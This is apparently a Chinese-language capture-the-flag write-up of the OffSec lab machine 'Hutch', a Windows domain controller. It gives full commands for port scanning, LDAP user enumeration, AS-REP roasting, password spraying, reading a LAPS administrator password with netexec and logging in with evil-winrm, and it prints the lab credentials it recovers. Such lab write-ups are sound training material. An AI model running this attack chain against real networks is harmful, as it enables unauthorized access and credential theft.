针对目标服务器进行端口探测，使用nmap工具

```
sudo nmap -p- -vvv --min-rate 10000 192.168.174.122
```

![image-20241107215436211](https://s2.loli.net/2024/11/07/vwzXNWpKCuEhgyF.png)

针对开放端口进一步探测

```
sudo nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49676,49692,49740 -A 192.168.174.122 -oX Hutch.xml
```

![image-20241107215501637](https://s2.loli.net/2024/11/07/HdnaNUwRiFJsyuO.png)

根据nmap的扫描结果，编辑hosts文件

```
192.168.174.122   hutch.offsec
192.168.174.122   HUTCHDC.hutch.offsec
```

针对LDAP协议进行扫描

```
ldapsearch -x -s base namingcontexts -H ldap://192.168.174.122:389
```

![image-20241107221329525](https://s2.loli.net/2024/11/07/QbtvldSepGqs2gN.png)

```
ldapsearch -x -b "DC=hutch,DC=offsec" -H ldap://192.168.174.122:389 > ldap.txt
cat ldap.txt | grep  sAMAccountName | awk '{print $2}'  > users_domain.txt
```

![image-20241107221953582](https://s2.loli.net/2024/11/07/dqBRt64L3sADU1r.png)

我们通过ldap获取到了一批用户名，尝试进行AS-REP ROASTING攻击

```
impacket-GetNPUsers hutch.offsec/ -usersfile users_domain.txt -dc-ip 192.168.174.122
```

![image-20241107222239368](https://s2.loli.net/2024/11/07/zmWuEA8saPgUHnb.png)

没有具体结果

尝试smbclient匿名登录也没有结果

尝试是否存在用户名和密码相同的情况

```
netexec smb 192.168.174.122 -u users_domain.txt -p passwords.txt
```

我们重新查看ldap下载的文件，发现了一条信息

![image-20241107223218473](https://s2.loli.net/2024/11/07/WN5nRwXQvapqADt.png)

是否存在密码没有修改的可能性，让我们尝试下

username：fmcsorley

password：CrabSharkJellyfish192

```
netexec smb 192.168.174.122 -u fmcsorley -p 'CrabSharkJellyfish192' --shares
```

![image-20241107223547516](https://s2.loli.net/2024/11/07/iz7HD1cuwrB2kEe.png)

成功获取一对账号密码，且这对账号密码无法winrm，只能登录smb，查看三个目录只有sysvol内有内容，进行下载

```
smbclient //192.168.174.122/SYSVOL -U fmcsorley
cd hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
cat Registry.pol
```

![image-20241107231105519](https://s2.loli.net/2024/11/07/f6EF9nDL7s1aGJr.png)

AdmPwd;AdmPwdEnabled 这个策略开启意味着启用了本地管理员账户的密码管理（https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps）

```
netexec ldap 192.168.174.122 -u fmcsorley -p 'CrabSharkJellyfish192' --kdcHost 192.168.174.122 -M laps
```

![image-20241107231348346](https://s2.loli.net/2024/11/07/Qkd5muexYDrjfTa.png)

我们获取到一个密码，使用密码喷射

password：]lCp&7s2!4G{Ud

![image-20241107231523482](https://s2.loli.net/2024/11/07/kewAMx62YU1cqvP.png)

均失败，尝试下管理员密码

```
 netexec winrm 192.168.174.122 -u administrator -p ']lCp&7s2!4G{Ud'   
```

![image-20241107231543091](https://s2.loli.net/2024/11/07/KcYkt2bL1OdwaPo.png)

成功，进行登录和flag获取

```
evil-winrm -i 192.168.174.122 -u administrator -p ']lCp&7s2!4G{Ud'
```
